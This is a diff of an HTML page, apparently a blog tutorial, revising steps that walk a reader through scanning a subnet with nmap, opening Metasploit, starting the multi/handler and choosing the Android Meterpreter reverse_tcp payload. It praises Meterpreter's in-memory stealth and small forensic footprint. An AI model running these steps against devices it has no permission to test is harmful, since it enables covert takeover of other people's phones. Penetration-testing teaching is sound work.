@@ -100,21 +100,26 @@
                         <p>This will show you all the network related information you will need further in the exploit. This includes your IP address.</p>
                         <p><img src="assets/post1pics/ifconfig.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
                         <h4>Step 2:</h4>
-                        <p>Run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> command as shown below</p>
+                        <p>Run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> command as shown below.</p>
                         <pre><code data-language="shell">nmap -sP subnet</code></pre>
-                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> is a Security Scanner that allows us to scan networks with different options. The flags denoted by <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">-sP</code> are the most commonly used and initiate a stealthier scan of the network as well as all the devices that are currently running. The entire subnet is scanned. This is shown below.</p>
+                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> is a Security Scanner that allows us to scan networks with different options. The flags denoted by <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">-sP</code> are the most commonly used and initiate a stealthier scan of the network as well as all the devices that are currently running. The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">subnet</code> option is a Classless Inter-Domain Routing (CIDR) representation for IP addresses. In essence it is a bit mask that shows what portions of the IP addresses can be utilised for the scan range. The entire subnet is scanned. This is shown below.</p>
                         <p><img src="assets/post1pics/nmap.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
-                        <p>Fire up the Metasploit console by running this command on your Kali Linux VM's terminal</p>
+                        <h4>Step 3:</h4>
+                        <p>In a new root terminal of your Kali Linux VM fire up the <i>Metasploit console</i> by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfconsole</code> command as shown below.</p>
                         <pre><code data-language="shell">msfconsole</code></pre>
                         <p>Your terminal should now look something like this</p>
                         <p><img src="assets/post1pics/msf.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
-                        <h4>Step 2:</h4>
-                        <p>Your terminal should have "msf6" as its prompt now. This means you can begin to use Metasploit commands. Type the command below.</p>
+                        <p>Your terminal should also have "msf6" as its prompt now. This means you can begin to use commands specific to <i>Metasploit</i>. Additionally, if you see any information popping up before the "msf6" prompt, then consider it an inside joke by the developers of the Framework.</p>
+                        <p><img src="assets/img/joke.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <h4>Step 4:</h4>
+                        <p>Now inside the Metasploit console type the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Multi Handler</code> command as shown below.</p>
                         <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
-                        <p>The Multi Handler command launches a stub that runs outside the Framework. This command launches a payload that is specific to our specification.</p>
-                        <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <h4>Step 3:</h4>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Multi Handler</code> command launches a stub that runs outside the Framework. This command launches a payload that can be used by our exploit and is built to our specifications, as we will see later.</p>
+                        <h4>Step 5:</h4>
+                        <p>Next run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Meterpreter</code> command as is shown below.</p>
                         <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <p>This will search through the Metasploit Framework to find an exploit that fits our search terms, i.e. an Android Meterpreter exploit. The commands from this and the previous step are shown below.</p>
+                        <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <p>Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of, as well as, find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is extremly limited.</p>
                         <h4>Step 4:</h4>
                         <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
